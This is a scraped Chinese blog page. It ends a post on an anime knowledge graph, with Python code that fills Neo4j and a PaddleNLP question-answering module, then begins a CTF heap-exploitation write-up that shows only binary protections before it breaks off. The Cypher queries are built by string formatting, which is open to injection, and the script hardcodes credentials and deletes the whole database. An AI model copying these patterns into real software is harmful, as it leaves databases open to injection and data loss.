(:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 3 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createreRationship</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        self.name_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.seiyuu_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.platform_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.role_name_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.role_img_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.author_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.classify_file.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        name_list = self.name_file.readlines()</span><br><span class="line">        author_list = self.author_file.readlines()</span><br><span class="line">        platform_list = self.platform_file.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            classify_list = self.classify_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_name_list = self.role_name_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_img_list = self.role_img_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            seiyuu_list = self.seiyuu_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(classify_list)-<span class="number">1</span>):</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:番剧类型&#123;类型:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (b)-[:类型]-&gt;(a)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       classify_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name_list)):</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (b)-[:属于]-&gt;(a)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:声优列表&#123;名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (a)-[:配音]-&gt;(b)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (seiyuu_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                      (b:制作公司&#123;名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b)-[:制作]-&gt;(a)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                   author_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                      (b:播放平台&#123;名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b)-[:播放]-&gt;(a)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                   platform_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 4 down&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_graph = Graph(<span class="string">&quot;http://127.0.0.1:7474/browser/&quot;</span>, auth=(<span class="string">&quot;neo4j&quot;</span>, <span class="string">&quot;123456789&quot;</span>))</span><br><span class="line">    test_graph.run(<span class="string">&#x27;match(n) detach delete n&#x27;</span>)</span><br><span class="line">    kg = KG()</span><br><span class="line">    kg.createEntity(test_graph)</span><br><span class="line">    kg.createreRationship(test_graph)</span><br></pre></td></tr></table></figure>
<p>另外对网页后端逻辑进行了修改，使其可以分类查找实体：</p>
<img src="/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/1678615439732.png" class width="1678615439732"> 
<h2 id="基于-PaddleNLP-的知识问答"><a href="#基于-PaddleNLP-的知识问答" class="headerlink" title="基于 PaddleNLP 的知识问答"></a>基于 PaddleNLP 的知识问答</h2><p>这次选择做番剧的知识图谱，就是为了尝试一下知识问答</p>
<p>该图谱的关系如下：</p>
<ul>
<li>[制作公司] -&gt; [制作] -&gt; [番剧名称]</li>
<li>[角色列表] -&gt; [属于] -&gt; [番剧名称]</li>
<li>[播放平台] -&gt; [播放] -&gt; [番剧名称]</li>
<li>[番剧类型] -&gt; [类型] -&gt; [番剧名称]</li>
<li>[声优列表] -&gt; [类型] -&gt; [角色列表]</li>
</ul>
<p><strong>PaddleNLP</strong> 提供开箱即用的产业级 <strong>NLP</strong> 预置任务能力，无需训练</p>
<ul>
<li>一键预测最全的中文任务：覆盖 <strong>自然语言理解</strong> 与 <strong>自然语言生成</strong> 两大核心应用</li>
<li>极致的产业级效果：在多个中文场景上提供产业级的 <strong>精度</strong> 与 <strong>预测性能</strong></li>
</ul>
<p>我的想法比较简单：</p>
<ul>
<li>用 PaddleNLP 对输入数据进行 “词性分析”，记录第一个名词</li>
<li>对该名词进行模糊匹配，判断该名词属于的实体类型，并获取名词后面的实体名称（记为主实体）</li>
<li>依据主实体类型调用不同的处理函数，然后在对应函数中查找目标的实体类型（记为次实体）</li>
<li>在一直主实体的情况下，次实体类型的判断会得到优化，例如：<ul>
<li>主实体为 [番剧名称]，那么次实体就只可能为 [番剧类型]，[角色列表]，[制作公司]，[播放平台] </li>
<li>主实体为 [角色列表]，那么次实体就只可能为 [声优列表]，[番剧名称]</li>
</ul>
</li>
<li>由于本知识图谱的关系比较单一（两个实体之间最多只会存在一种关系），因此我们不需要去分析实体之间的关系，而是通过主实体和次实体来推断出关系类型</li>
</ul>
<p>效果如下图：</p>
<img src="/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/1678608243118-1678615461425.png" class width="1678608243118"> 
<img src="/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/1678608300113-1678615461426.png" class width="1678608300113"> 
<img src="/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/1678615361466.png" class width="1678615361466"> 
<p>实现该功能的核心代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> paddlenlp <span class="keyword">import</span> Taskflow</span><br><span class="line"><span class="keyword">from</span> fuzzywuzzy <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> fuzzywuzzy <span class="keyword">import</span> fuzz</span><br><span class="line"><span class="keyword">from</span> . models <span class="keyword">import</span> Neo4j</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">choices_anime = [<span class="string">&quot;动画&quot;</span>, <span class="string">&quot;动画片&quot;</span>, <span class="string">&quot;番剧&quot;</span>, <span class="string">&quot;动漫&quot;</span>,<span class="string">&quot;作品&quot;</span>]</span><br><span class="line">choices_role = [<span class="string">&quot;角色&quot;</span>, <span class="string">&quot;人物&quot;</span>]</span><br><span class="line">choices_seiyuu = [<span class="string">&quot;声优&quot;</span>, <span class="string">&quot;配音&quot;</span>]</span><br><span class="line">choices_author = [<span class="string">&quot;公司&quot;</span>, <span class="string">&quot;团队&quot;</span>, <span class="string">&quot;作者&quot;</span>]</span><br><span class="line">choices_classify = [<span class="string">&quot;类型&quot;</span>, <span class="string">&quot;类别&quot;</span>, <span class="string">&quot;分类&quot;</span>]</span><br><span class="line">choices_platform = [<span class="string">&quot;平台&quot;</span>, <span class="string">&quot;播放平台&quot;</span>]</span><br><span class="line"></span><br><span class="line">choices_anime_do = [<span class="string">&quot;有&quot;</span>,<span class="string">&quot;是&quot;</span>,<span class="string">&quot;的&quot;</span>]</span><br><span class="line">choices_seiyuu_do = [<span class="string">&quot;给&quot;</span>, <span class="string">&quot;配&quot;</span>, <span class="string">&quot;配音&quot;</span>]</span><br><span class="line">choices_author_do = [<span class="string">&quot;制作&quot;</span>, <span class="string">&quot;创造&quot;</span>, <span class="string">&quot;创作&quot;</span>]</span><br><span class="line">choices_role_do = [<span class="string">&quot;属于&quot;</span>,<span class="string">&quot;是&quot;</span>,<span class="string">&quot;的&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NER</span>():</span></span><br><span class="line">    db = <span class="number">0</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    entity_list = []</span><br><span class="line">    anime_list = []</span><br><span class="line">    author_list = []</span><br><span class="line">    classify_list = []</span><br><span class="line">    platform_list = []</span><br><span class="line">    role_list = []</span><br><span class="line">    seiyuu_list = []</span><br><span class="line"></span><br><span class="line">    entity = <span class="string">&quot;&quot;</span></span><br><span class="line">    anime = <span class="string">&quot;&quot;</span></span><br><span class="line">    author = <span class="string">&quot;&quot;</span></span><br><span class="line">    classify = <span class="string">&quot;&quot;</span></span><br><span class="line">    platform = <span class="string">&quot;&quot;</span></span><br><span class="line">    role = <span class="string">&quot;&quot;</span></span><br><span class="line">    seiyuu = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    entityRelation = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">question_answering</span>(<span class="params">self,entity</span>):</span></span><br><span class="line">        self.db = Neo4j()</span><br><span class="line">        self.db.connectDB()</span><br><span class="line">        tag = Taskflow(<span class="string">&quot;pos_tagging&quot;</span>)</span><br><span class="line">        self.entity = entity</span><br><span class="line">        self.entity_list = tag(entity)</span><br><span class="line">        self.get_major()</span><br><span class="line">        <span class="keyword">if</span>(self.anime_list <span class="keyword">or</span> self.author_list <span class="keyword">or</span> self.classify_list <span class="keyword">or</span></span><br><span class="line">        self.platform_list <span class="keyword">or</span> self.role_list <span class="keyword">or</span> self.seiyuu_list):</span><br><span class="line">            self.entityRelation = [self.anime_list, self.author_list,</span><br><span class="line">                                   self.classify_list, self.platform_list,</span><br><span class="line">                                   self.role_list, self.seiyuu_list]</span><br><span class="line">        <span class="keyword">return</span> self.entityRelation</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_major</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">            <span class="keyword">if</span> (self.entity_list[i][<span class="number">1</span>] == <span class="string">&#x27;n&#x27;</span>):</span><br><span class="line">                <span class="keyword">if</span> (i+<span class="number">1</span> &lt; <span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">                    <span class="keyword">if</span> (process.extractOne(self.entity_list[i][<span class="number">0</span>], choices_anime)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">len</span>(self.entity_list[i + <span class="number">2</span>]) != <span class="number">0</span>):</span><br><span class="line">                            self.anime = re.findall(<span class="string">&#x27;《(.*?)》&#x27;</span>,self.entity)[<span class="number">0</span>]</span><br><span class="line">                            self.index = i-<span class="number">1</span></span><br><span class="line">                            <span class="built_in">print</span>(self.anime)</span><br><span class="line">                            self.get_minor_anime()</span><br><span class="line">                    <span class="keyword">elif</span> (process.extractOne(self.entity_list[i][<span class="number">0</span>], choices_role)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        self.role = self.entity_list[i + <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                        self.index = i-<span class="number">1</span></span><br><span class="line">                        <span class="built_in">print</span>(self.role)</span><br><span class="line">                        self.get_minor_role()</span><br><span class="line">                    <span class="keyword">elif</span> (process.extractOne(self.entity_list[i][<span class="number">0</span>], choices_seiyuu)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        self.seiyuu = self.entity_list[i + <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                        self.index = i-<span class="number">1</span></span><br><span class="line">                        <span class="built_in">print</span>(self.seiyuu)</span><br><span class="line">                        self.get_minor_seiyuu()</span><br><span class="line">                    <span class="keyword">elif</span> (process.extractOne(self.entity_list[i][<span class="number">0</span>], choices_author)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        self.author = self.entity_list[i + <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                        self.index = i-<span class="number">1</span></span><br><span class="line">                        <span class="built_in">print</span>(self.author)</span><br><span class="line">                        self.get_minor_author()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_minor_anime</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.anime_list = self.db.name2anime(self.anime)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.entity_list) - self.index):</span><br><span class="line">            <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index][<span class="number">0</span>], choices_anime_do)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    <span class="keyword">if</span> (i+self.index+j&gt;=<span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_role)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;角色&quot;</span>)</span><br><span class="line">                        self.role_list = self.db.anime2role(self.anime)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_classify)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;类型&quot;</span>)</span><br><span class="line">                        self.classify_list = self.db.anime2classify(self.anime)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_platform)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;平台&quot;</span>)</span><br><span class="line">                        self.platform_list = self.db.anime2platform(self.anime)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_minor_role</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.role_list = self.db.name2role(self.role)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.entity_list) - self.index):</span><br><span class="line">            <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index][<span class="number">0</span>], choices_role_do)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    <span class="keyword">if</span> (i+self.index+j&gt;=<span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_anime)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;番剧&quot;</span>)</span><br><span class="line">                        self.anime_list = self.db.role2anime(self.role)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_seiyuu)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;配音&quot;</span>)</span><br><span class="line">                        self.seiyuu_list = self.db.role2seiyuu(self.role)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_minor_seiyuu</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seiyuu_list = self.db.name2seiyuu(self.seiyuu)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.entity_list) - self.index):</span><br><span class="line">            <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index][<span class="number">0</span>], choices_seiyuu_do)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    <span class="keyword">if</span> (i+self.index+j&gt;=<span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    if (process.extractOne(self.entity_list[i + self.index + j][0], choices_anime)[1] &gt; 60):</span></span><br><span class="line"><span class="string">                        print(&quot;番剧&quot;)</span></span><br><span class="line"><span class="string">                        self.anime_list = self.db.</span></span><br><span class="line"><span class="string">                        break</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_role)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;角色&quot;</span>)</span><br><span class="line">                        self.role_list = self.db.seiyuu2role(self.seiyuu)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_minor_author</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.author_list = self.db.name2author(self.author)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.entity_list) - self.index):</span><br><span class="line">            <span class="keyword">if</span> (i+self.index&gt;=<span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index][<span class="number">0</span>], choices_anime)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;番剧&quot;</span>)</span><br><span class="line">                self.anime_list = self.db.author2anime(self.author)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">声优花泽香菜配音过的角色</span></span><br><span class="line"><span class="string">公司EMTSquared的作品</span></span><br><span class="line"><span class="string">角色藤户千雪的声优是谁</span></span><br><span class="line"><span class="string">番剧《普通女高中生要做当地偶像》的角色有哪些</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/10/House%20Of%20Atum-2.27-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/10/House%20Of%20Atum-2.27-64/" class="post-title-link" itemprop="url">House Of Atum-2.27-64</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-10 16:59:08 / Modified: 17:00:02" itemprop="dateCreated datePublished" datetime="2023-03-10T16:59:08+08:00">2023-03-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>houseofAtum</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">houseofAtum: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=ac40687beee1b00aa55c6dc25d383a41fbfdb0e2, <span class="keyword">not</span> stripped      </span><br><span class="line">[!] Could <span class="keyword">not</span> populate PLT: invalid syntax (unicorn.py, line <span class="number">110</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/atum/houseofAtum&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
